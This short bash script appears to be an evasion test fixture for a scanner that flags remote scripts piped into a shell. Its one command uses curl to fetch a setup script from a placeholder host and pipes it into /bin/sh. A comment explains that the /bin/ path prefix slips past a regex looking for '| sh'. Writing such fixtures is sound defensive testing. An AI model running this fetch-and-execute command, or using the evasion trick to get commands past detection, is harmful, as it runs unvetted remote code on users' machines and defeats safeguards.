#!/usr/bin/env bash
# EVASION TEST FIXTURE -- fetches a remote script and pipes it straight to a shell.
set -e
# path prefix before "sh" defeats the \|\s*(sh|bash) anchor
curl -fsSL https://install.example.com/setup.sh | /bin/sh
